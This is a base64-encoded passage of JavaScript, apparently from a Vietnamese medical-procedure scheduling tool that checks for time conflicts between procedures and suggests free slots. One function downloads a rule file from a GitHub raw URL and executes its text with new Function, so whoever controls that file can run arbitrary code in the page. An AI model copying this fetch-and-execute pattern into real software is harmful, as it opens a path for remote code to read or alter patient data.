ICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlSW5mbzogUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3Qgc3RhcnQgPSBwYXJzZURhdGVUaW1lKHJvd1tzdGFydEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGVuZCA9IHBhcnNlRGF0ZVRpbWUocm93W2VuZEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFzdGFydCB8fCAhZW5kKSB7DQogICANCiAgICBza2lwcGVkUm93cysrOw0KICAgIHJldHVybjsNCn0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHN0YXJ0LmRhdGVLZXkgIT09IGVuZC5kYXRlS2V5KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nRXJyb3IoJ1Ro4bunIHRodeG6rXQgYuG6r3QgxJHhuqd1IHbDoCBr4bq/dCB0aMO6YyBraMOhYyBuZ8OgeScsIHJvd051bWJlciwgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydERhdGU6IHN0YXJ0LmRhdGVLZXksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZERhdGU6IGVuZC5kYXRlS2V5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChlbmQuc2Vjb25kcyA8PSBzdGFydC5zZWNvbmRzKSB7DQogICAgbG9nRXJyb3IoJ1Ro4budaSBnaWFuIGvhur90IHRow7pjIHBo4bqjaSBzYXUgdGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1Jywgcm93TnVtYmVyLCB7DQogICAgICAgIHN0YXJ0VGltZTogc3RhcnQuZGlzcGxheVRpbWUsDQogICAgICAgIGVuZFRpbWU6IGVuZC5kaXNwbGF5VGltZSwNCiAgICAgICAgc3RhcnRWYWx1ZTogcm93W3N0YXJ0SW5kZXhdLA0KICAgICAgICBlbmRWYWx1ZTogcm93W2VuZEluZGV4XSwNCiAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgbmdheVRodWNIaWVuOiBkYXRlSW5kZXggIT09IC0xID8gcm93W2RhdGVJbmRleF0gOiAnS2jDtG5nIHjDoWMgxJHhu4tuaCcNCiAgICB9KTsNCiAgICBza2lwcGVkUm93cysrOw0KICAgIHJldHVybjsNCn0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZXhwZWN0ZWREdXJhdGlvbiA9IFBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0/LmR1cmF0aW9uIHx8IDA7DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBhY3R1YWxEdXJhdGlvbk1pbnV0ZXMgPSAoZW5kLnNlY29uZHMgLSBzdGFydC5zZWNvbmRzKSAvIDYwOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQppZiAoZXhwZWN0ZWREdXJhdGlvbiA+IDAgJiYgTWF0aC5hYnMoYWN0dWFsRHVyYXRpb25NaW51dGVzIC0gZXhwZWN0ZWREdXJhdGlvbikgPiAxKSB7DQogICAgbG9nRXJyb3IoYGAsIHJvd051bWJlciwgew0KICAgICAgICBwcm9jZWR1cmU6IHByb2NlZHVyZU5hbWUsDQogICAgICAgIGV4cGVjdGVkOiBleHBlY3RlZER1cmF0aW9uLA0KICAgICAgICBhY3R1YWw6IGFjdHVhbER1cmF0aW9uTWludXRlcywNCiAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgIG9wZXJhdG9yOiByb3dbb3BlcmF0b3JJbmRleF0gPyByb3dbb3BlcmF0b3JJbmRleF0ucmVwbGFjZSgvLC9nLCAnJykgOiAnS2jDtG5nIGPDsycsDQogICAgICAgIGRhdGU6IHN0YXJ0LmRhdGVLZXksDQogICAgICAgIG5nYXlUaHVjSGllbjogZGF0ZUluZGV4ICE9PSAtMSA/IHJvd1tkYXRlSW5kZXhdIDogJ0tow7RuZyB4w6FjIMSR4buLbmgnLA0KICAgICAgICBzdGFydFRpbWU6IHN0YXJ0LmRpc3BsYXlUaW1lLA0KICAgICAgICBlbmRUaW1lOiBlbmQuZGlzcGxheVRpbWUsDQogICAgICAgIGRvY3Rvcjogcm93W2RvY3RvckluZGV4XSB8fCAnS2jDtG5nIGPDsycgLy8gVGjDqm0gZMOybmcgbsOgeQ0KICAgIH0pOw0KfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwcm9jZWR1cmVOYW1lID09PSAnU+G6r2MgdGh14buRYyB0aGFuZycpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZXJiUHJvY2VkdXJlcy5wdXNoKHByb2NlZHVyZXNbcHJvY2VkdXJlcy5sZW5ndGggLSAxXSk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmVzLnB1c2goew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvd0luZGV4OiByb3dOdW1iZXIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aWVudElkOiBwYXRpZW50SWRJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudElkSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmU6IHByb2NlZHVyZU5hbWUsDQoJCQkJCQkJZG9jdG9yOiByb3dbZG9jdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRlOiBzdGFydC5kYXRlS2V5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXJ0OiBzdGFydC5zZWNvbmRzLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZDogZW5kLnNlY29uZHMsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheVN0YXJ0OiBzdGFydC5kaXNwbGF5VGltZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNwbGF5RW5kOiBlbmQuZGlzcGxheVRpbWUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3BlcmF0b3I6IHJvd1tvcGVyYXRvckluZGV4XSB8fCAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uZmxpY3Q6IGZhbHNlLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbmZsaWN0UmVhc29uOiAnJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmVJbmZvOiBQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN1Z2dlc3Rpb246ICcnDQogICAgICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGxvZ0Vycm9yKGBM4buXaSB44butIGzDvSBkw7JuZzogJHtlcnJvci5tZXNzYWdlfWAsIHJvd051bWJlciwgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnROYW1lOiBuYW1lSW5kZXggIT09IC0xID8gcm93W25hbWVJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZTogcm93W3Byb2NlZHVyZUluZGV4XSB8fCAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXJyb3JEZXRhaWxzOiBlcnJvci5zdGFjaw0KICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgICAgICBza2lwcGVkUm93cysrOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKHByb2NlZHVyZXMubGVuZ3RoID09PSAwKSB7DQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcignS2jDtG5nIGPDsyB0aOG7pyB0aHXhuq10IG7DoG8gaOG7o3AgbOG7hyDEkeG7gyBraeG7g20gdHJhLiBWdWkgbMOybmcga2nhu4NtIHRyYSBs4bqhaSBk4buvIGxp4buHdS4nKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgY2hlY2tDb25mbGljdHMocHJvY2VkdXJlcyk7DQogICAgICAgICAgICAgICAgZ2VuZXJhdGVUaW1lU3VnZ2VzdGlvbnMocHJvY2VkdXJlcyk7DQogICAgICAgICAgICAgICAgZGlzcGxheVJlc3VsdHMocHJvY2VkdXJlcywgc2tpcHBlZFJvd3MpOw0KICAgICAgICAgICAgICAgIHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcyA9IGhlcmJQcm9jZWR1cmVzOw0KCQkJCS8vIC0tLSBD4bqtcCBuaOG6rXQgc+G7kSBjYSBraMOhYyDEkWEgc+G7kSB0csOqbiBuw7p0IC0tLQ0Kc2V0VGltZW91dCgoKSA9PiB7DQogIGlmICh0eXBlb2YgdXBkYXRlSGVyYkJ1dHRvbldpdGhPdXRsaWVyQ291bnQgPT09ICdmdW5jdGlvbicpIHsNCiAgICB1cGRhdGVIZXJiQnV0dG9uV2l0aE91dGxpZXJDb3VudCgpOw0KICB9DQp9LCAxMDApOw0KDQogICAgICAgICAgICAgICAgZGlzcGxheUVycm9ycygpOw0KICAgICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHsNCiAgICAgICAgICAgICAgICBsb2dFcnJvcihlcnJvci5tZXNzYWdlLCBudWxsLCBlcnJvci5zdGFjayk7DQogICAgICAgICAgICAgICAgZGlzcGxheUVycm9ycygpOw0KICAgICAgICAgICAgICAgIGFsZXJ0KCdDw7MgbOG7l2kgeOG6o3kgcmEga2hpIHjhu60gbMO9IGThu68gbGnhu4d1OiAnICsgZXJyb3IubWVzc2FnZSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KDQpsZXQgY29uZmxpY3RSdWxlc1RleHQgPSAnJzsNCg0KYXN5bmMgZnVuY3Rpb24gbG9hZENvbmZsaWN0UnVsZXMoKSB7DQogICAgdHJ5IHsNCiAgICAgICAgY29uc3QgdXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaGF1aHV5bmgwMTA0L2NoYXVodXluaDAxMDQudHh0L3JlZnMvaGVhZHMvbWFpbi9jaGF1X3hsdGh1dGh1YXQudHh0P3RzPScgKyBEYXRlLm5vdygpOw0KICAgICAgICBjb25zdCByZXMgPSBhd2FpdCBmZXRjaCh1cmwpOw0KICAgICAgICBpZiAoIXJlcy5vaykgdGhyb3cgbmV3IEVycm9yKCdLaMO0bmcgdOG6o2kgxJHGsOG7o2MgY2hhdV94bHRodXRodWF0LnR4dCcpOw0KICAgICAgICBjb25mbGljdFJ1bGVzVGV4dCA9IChhd2FpdCByZXMudGV4dCgpKS50cmltKCk7DQogICAgfSBjYXRjaCAoZSkgew0KICAgICAgICBjb25zb2xlLmVycm9yKCdM4buXaSB04bqjaSBjaGF1X3hsdGh1dGh1YXQudHh0OicsIGUpOw0KICAgICAgICBjb25mbGljdFJ1bGVzVGV4dCA9ICcnOyAvLyBmYWxsYmFjazogcuG7l25nIC0+IGNvaSBuaMawIGtow7RuZyBjw7Mgbmdv4bqhaSBs4buHDQogICAgfQ0KfQ0KDQoNCg0KDQogICAgICAgIGZ1bmN0aW9uIGNoZWNrQ29uZmxpY3RzKHByb2NlZHVyZXMpIHsNCiAgICAgICAgICAgIGNvbnN0IGlnbm9yZUFkamFjZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2lnbm9yZUFkamFjZW50Q2hlY2tib3gnKS5jaGVja2VkOw0KICAgICAgICAgICAgY29uc3QgZ3JvdXBzID0ge307DQogICAgICAgICAgICANCiAgICAgICAgICAgIHByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgICAgICAgICBjb25zdCBrZXkgPSBgJHtwcm9jLm9wZXJhdG9yfV8ke3Byb2MuZGF0ZX1gOw0KICAgICAgICAgICAgICAgIGlmICghZ3JvdXBzW2tleV0pIHsNCiAgICAgICAgICAgICAgICAgICAgZ3JvdXBzW2tleV0gPSBbXTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZ3JvdXBzW2tleV0ucHVzaChwcm9jKTsNCiAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBPYmplY3QudmFsdWVzKGdyb3VwcykuZm9yRWFjaChncm91cCA9PiB7DQogICAgICAgICAgICAgICAgZ3JvdXAuc29ydCgoYSwgYikgPT4gYS5zdGFydCAtIGIuc3RhcnQpOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAxOyBpIDwgZ3JvdXAubGVuZ3RoOyBpKyspIHsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgcHJldiA9IGdyb3VwW2kgLSAxXTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgY3VycmVudCA9IGdyb3VwW2ldOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBwcmV2RW5kV2l0aEJ1ZmZlciA9IHByZXYuZW5kICsgKHByZXYucHJvY2VkdXJlSW5mbz8uYnVmZmVyIHx8IDApICogNjA7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBjb25zdCBpc0FkamFjZW50ID0gaWdub3JlQWRqYWNlbnQgJiYgY3VycmVudC5zdGFydCA9PT0gcHJldi5lbmQ7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiAoY3VycmVudC5zdGFydCA8IHByZXZFbmRXaXRoQnVmZmVyICYmICFpc0FkamFjZW50KSB7DQogICAgICAgICAgICAgICAgIA0KDQpsZXQgaXNDb25mbGljdCA9IHRydWU7DQogICAgdHJ5IHsNCiAgICAgICAgaWYgKGNvbmZsaWN0UnVsZXNUZXh0ICYmIGNvbmZsaWN0UnVsZXNUZXh0LnRyaW0oKSkgew0KICAgICAgICAgICAgY29uc3QgY29uZmxpY3RDb25kaXRpb24gPSBuZXcgRnVuY3Rpb24oJ3ByZXYnLCdjdXJyZW50JywncmV0dXJuICcgKyBjb25mbGljdFJ1bGVzVGV4dC50cmltKCkpOw0KICAgICAgICAgICAgLy8gY29uZmxpY3RDb25kaXRpb24oKSBUUuG6oiBW4buAIHRydWUgbuG6v3UgKsSRxrDhu6NjIG1p4buFbiB4dW5nIMSR4buZdCoNCiAgICAgICAgICAgIGNvbnN0IGFsbG93ZWQgPSBjb25mbGljdENvbmRpdGlvbihwcmV2LCBjdXJyZW50KTsNCiAgICAgICAgICAgIGlzQ29uZmxpY3QgPSAhYWxsb3dlZDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGlzQ29uZmxpY3QgPSB0cnVlOyAvLyBraMO0bmcgY8OzIHJ1bGUgLT4gY+G7qSBiw6FvIHh1bmcgxJHhu5l0DQogICAgICAgIH0NCiAgICB9IGNhdGNoIChlcnIpIHsNCiAgICAgICAgY29uc29sZS5lcnJvcignTOG7l2kga2hpIMSRw6FuaCBnacOhIHh1bmcgxJHhu5l0IHRo4budaSBnaWFuOicsIGVycik7DQogICAgICAgIGlzQ29uZmxpY3QgPSB0cnVlOw0KICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlzQ29uZmxpY3QpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXJyZW50LmNvbmZsaWN0ID0gdHJ1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjdXJyZW50LmNvbmZsaWN0UmVhc29uID0gYCR7cHJldi5wcm9jZWR1cmV9PGJyPuKAoiBC4buHbmggbmjDom46ICR7cHJldi5wYXRpZW50TmFtZX08YnI+4oCiIE5nw6B5OiAke3ByZXYuZGF0ZX08YnI+4oCiIFRo4budaSBnaWFuOiAke3ByZXYuZGlzcGxheVN0YXJ0fS0ke3ByZXYuZGlzcGxheUVuZH1gOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJldi5jb25mbGljdCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFwcmV2LmNvbmZsaWN0UmVhc29uLmluY2x1ZGVzKGN1cnJlbnQucHJvY2VkdXJlKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmV2LmNvbmZsaWN0UmVhc29uICs9IChwcmV2LmNvbmZsaWN0UmVhc29uID8gJzxicj48YnI+JyA6ICcnKSArIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYCAke2N1cnJlbnQucHJvY2VkdXJlfTxicj7igKIgQuG7h25oIG5ow6JuOiAke2N1cnJlbnQucGF0aWVudE5hbWV9PGJyPuKAoiBOZ8OgeTogJHtjdXJyZW50LmRhdGV9PGJyPuKAoiBUaOG7nWkgZ2lhbjogJHtjdXJyZW50LmRpc3BsYXlTdGFydH0tJHtjdXJyZW50LmRpc3BsYXlFbmR9YDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9KTsNCiAgICAgICAgfQ0KDQpmdW5jdGlvbiBnZW5lcmF0ZVRpbWVTdWdnZXN0aW9ucyhwcm9jZWR1cmVzKSB7DQogICAgY29uc3QgdGltZU9wdGlvbiA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2lucHV0W25hbWU9InRpbWVPcHRpb24iXTpjaGVja2VkJykudmFsdWU7DQogICAgY29uc3Qgc3RhcnRIb3VyID0gdGltZU9wdGlvbiA9PT0gJzc6MzAnID8gNy41IDogNzsNCiAgICBjb25zdCBpZ25vcmVBZGphY2VudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpZ25vcmVBZGphY2VudENoZWNrYm94JykuY2hlY2tlZDsNCiAgICBjb25zdCBidWZmZXJNaW51dGVzID0gaWdub3JlQWRqYWNlbnQgPyAwIDogMTsNCiAgICBjb25zdCBzaG93TW9yZVN1Z2dlc3Rpb25zID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dNb3JlU3VnZ2VzdGlvbnNDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgDQogICAgLy8gU+G7kSBraHVuZyBnaeG7nSB04buRaSDEkWEgbeG7l2kgYnXhu5VpIChu4bq/dSBjaOG7jW4gNiBraHVuZyB0aMOsIDMgc8OhbmcgKyAzIGNoaeG7gXUpDQogICAgY29uc3QgbWF4TW9ybmluZyA9IHNob3dNb3JlU3VnZ2VzdGlvbnMgPyAzIDogMjsNCiAgICBjb25zdCBtYXhBZnRlcm5vb24gPSBzaG93TW9yZVN1Z2dlc3Rpb25zID8gMyA6IDE7DQoNCiAgICBwcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgIGlmICghcHJvYy5jb25mbGljdCkgcmV0dXJuOw0KDQogICAgICAgIGNvbnN0IHNhbWVEYXlQcm9jZWR1cmVzID0gcHJvY2VkdXJlcy5maWx0ZXIocCA9PiANCiAgICAgICAgICAgIHAuZGF0ZSA9PT0gcHJvYy5kYXRlICYmIA0KICAgICAgICAgICAgcC5vcGVyYXRvciA9PT0gcHJvYy5vcGVyYXRvciAmJg0KICAgICAgICAgICAgcC5yb3dJbmRleCAhPT0gcHJvYy5yb3dJbmRleA0KICAgICAgICApOw0KDQogICAgICAgIGNvbnN0IGR1cmF0aW9uU2Vjb25kcyA9IHByb2MuZW5kIC0gcHJvYy5zdGFydCArIChidWZmZXJNaW51dGVzICogNjApOw0KICAgICAgICANCiAgICAgICAgLy8gVMOsbSBraHVuZyBnaeG7nSBideG7lWkgc8OhbmcNCiAgICAgICAgY29uc3QgbW9ybmluZ1Nsb3RzID0gZmluZEF2YWlsYWJsZVNsb3RzKA0KICAgICAgICAgICAgc3RhcnRIb3VyICogMzYwMCwgDQogICAgICAgICAgICAxMS41ICogMzYwMCwgDQogICAgICAgICAgICBkdXJhdGlvblNlY29uZHMsIA0KICAgICAgICAgICAgc2FtZURheVByb2NlZHVyZXMsIA0KICAgICAgICAgICAgbWF4TW9ybmluZw0KICAgICAgICApOw0KICAgICAgICANCiAgICAgICAgLy8gVMOsbSBraHVuZyBnaeG7nSBideG7lWkgY2hp4buBdQ0KICAgICAgICBjb25zdCBhZnRlcm5vb25TbG90cyA9IGZpbmRBdmFpbGFibGVTbG90cygNCiAgICAgICAgICAgIDEzLjUgKiAzNjAwLCANCiAgICAgICAgICAgIDE3ICogMzYwMCwgDQogICAgICAgICAgICBkdXJhdGlvblNlY29uZHMsIA0KICAgICAgICAgICAgc2FtZURheVByb2NlZHVyZXMsIA0KICAgICAgICAgICAgbWF4QWZ0ZXJub29uDQogICAgICAgICk7DQoNCiAgICAgICAgLy8gRm9ybWF0IGvhur90IHF14bqjDQogICAgICAgIGxldCBzdWdnZXN0aW9ucyA9IFtdOw0KICAgICAgICBpZiAobW9ybmluZ1Nsb3RzLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgIHN1Z2dlc3Rpb25zLnB1c2goJzxzdHJvbmc+U8Ohbmc6PC9zdHJvbmc+PGJyPicgKyANCiAgICAgICAgICAgICAgICBtb3JuaW5nU2xvdHMubWFwKHNsb3QgPT4gYCR7c2xvdC5zdGFydH0gLSAke3Nsb3QuZW5kfWApLmpvaW4oJzxicj4nKSk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGFmdGVybm9vblNsb3RzLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgIHN1Z2dlc3Rpb25zLnB1c2goJzxzdHJvbmc+Q2hp4buBdTo8L3N0cm9uZz48YnI+JyArIA0KICAgICAgICAgICAgICAgIGFmdGVybm9vblNsb3RzLm1hcChzbG90ID0+IGAke3Nsb3Quc3RhcnR9IC0gJHtzbG90LmVuZH1gKS5qb2luKCc8YnI+JykpOw0KICAgICAgICB9DQoNCiAgICAgICAgDQppZiAobW9ybmluZ1Nsb3RzLmxlbmd0aCArIGFmdGVybm9vblNsb3RzLmxlbmd0aCA+IDApIHsNCiAgICBjb25zdCBmaXJzdFNsb3QgPSBtb3JuaW5nU2xvdHNbMF0gfHwgYWZ0ZXJub29uU2xvdHNbMF07DQogICAgY29uc3Qgc21hcnRIaW50ID0gYDxicj48ZGl2IHN0eWxlPSJtYXJnaW4tdG9wOjZweDtjb2xvcjojMDA3OTZiO2ZvbnQtd2VpZ2h0OjYwMCI+DQogICAg8J+RiSBH4bujaSDDvTogROG7nWkgdOG7qyA8dT4ke3Byb2MuZGlzcGxheVN0YXJ0fTwvdT4g4oaSIDx1PiR7Zmlyc3RTbG90LnN0YXJ0fTwvdT4NCiAgICA8L2Rpdj5gOw0KDQogICAgcHJvYy5zdWdnZXN0aW9uID0gc3VnZ2VzdGlvbnMuam9pbignPGJyPicpICsgc21hcnRIaW50Ow0KfSBlbHNlIHsNCiAgICBwcm9jLnN1Z2dlc3Rpb24gPSAnPHNwYW4gY2xhc3M9Im5vLXN1Z2dlc3Rpb24iPktow7RuZyBjw7Mga2h1bmcgZ2nhu50gdHLhu5FuZzwvc3Bhbj4nOw0KfQ0KDQogICAgfSk7DQp9DQovLyBIw6BtIGtp4buDbSB0cmEgeHVuZyDEkeG7mXQgdGjhu51pIGdpYW4NCmZ1bmN0aW9uIGhhc1RpbWVDb25mbGljdChzdGFydFRpbWUsIGR1cmF0aW9uLCBwcm9jZWR1cmVzKSB7DQogICAgY29uc3QgZW5kVGltZSA9IHN0YXJ0VGltZSArIGR1cmF0aW9uOw0KICAgIA0KICAgIGZvciAoY29uc3QgcHJvYyBvZiBwcm9jZWR1cmVzKSB7DQogICAgICAgIGNvbnN0IHByb2NTdGFydCA9IHByb2Muc3RhcnQ7DQogICAgICAgIGNvbnN0IHByb2NFbmQgPSBwcm9jLmVuZCArIChwcm9jLnByb2NlZHVyZUluZm8/LmJ1ZmZlciB8fCAwKSAqIDYwOw0KICAgICAgICANCiAgICAgICAgaWYgKChzdGFydFRpbWUgPj0gcHJvY1N0YXJ0ICYmIHN0YXJ0VGltZSA8IHByb2NFbmQpIHx8IA0KICAgICAgICAgICAgKGVuZFRpbWUgPiBwcm9jU3RhcnQgJiYgZW5kVGltZSA8PSBwcm9jRW5kKSB8fA0KICAgICAgICAgICAgKHN0YXJ0VGltZSA8PSBwcm9jU3RhcnQgJiYgZW5kVGltZSA+PSBwcm9jRW5kKSkgew0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCiAgICB9DQogICAgDQogICAgcmV0dXJuIGZhbHNlOw0KfQ0KLy8gSMOgbSB0w6xtIGtodW5nIGdp4budIHRy4buRbmcNCmZ1bmN0aW9uIGZpbmRBdmFpbGFibGVTbG90cyhzdGFydFRpbWUsIGVuZFRpbWUsIGR1cmF0aW9uLCBwcm9jZWR1cmVzLCBtYXhTbG90cykgew0KICAgIGNvbnN0IHNsb3RzID0gW107DQogICAgbGV0IGN1cnJlbnRUaW1lID0gc3RhcnRUaW1lOw0KICAgIGNvbnN0IGlnbm9yZUFkamFjZW50ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2lnbm9yZUFkamFjZW50Q2hlY2tib3gnKS5jaGVja2VkOw0KICAgIGNvbnN0IGJ1ZmZlck1pbnV0ZXMgPSBpZ25vcmVBZGphY2VudCA/IDAgOiAxOw0KICAgIA0KICAgIHdoaWxlIChjdXJyZW50VGltZSArIGR1cmF0aW9uIDw9IGVuZFRpbWUgJiYgc2xvdHMubGVuZ3RoIDwgbWF4U2xvdHMpIHsNCiAgICAgICAgaWYgKCFoYXNUaW1lQ29uZmxpY3QoY3VycmVudFRpbWUsIGR1cmF0aW9uLCBwcm9jZWR1cmVzKSkgew0KICAgICAgICAgICAgc2xvdHMucHVzaCh7DQogICAgICAgICAgICAgICAgc3RhcnQ6IHNlY29uZHNUb1RpbWVTdHIoY3VycmVudFRpbWUpLA0KICAgICAgICAgICAgICAgIGVuZDogc2Vjb25kc1RvVGltZVN0cihjdXJyZW50VGltZSArIChkdXJhdGlvbiAtIChidWZmZXJNaW51dGVzICogNjApKSkgLy8gVHLhu6sgYnVmZmVyIMSR4buDIGhp4buDbiB0aOG7iw0KICAgICAgICAgICAgfSk7DQogICAgICAgIH0NCiAgICAgICAgY3VycmVudFRpbWUgKz0gMTUgKiA2MDsgLy8gS2nhu4NtIHRyYSBt4buXaSAxNSBwaMO6dA0KICAgIH0NCiAgICANCiAgICByZXR1cm4gc2xvdHM7DQp9DQoNCiAgICAgICAgZnVuY3Rpb24gc2Vjb25kc1RvVGltZVN0cihzZWNvbmRzKSB7DQogICAgICAgICAgICBjb25zdCBob3VycyA9IE1hdGguZmxvb3Ioc2Vjb25kcyAvIDM2MDApOw0KICAgICAgICAgICAgY29uc3QgbWludXRlcyA9IE1hdGguZmxvb3IoKHNlY29uZHMgJSAzNjAwKSAvIDYwKTsNCiAgICAgICAgICAgIHJldHVybiBgJHtob3Vycy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9OiR7bWludXRlcy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9YDsNCiAgICAgICAgfQ0KDQoNCi8vIMSQ4bq/bSB04buVbmcgY2EgInPhuq9jIHRode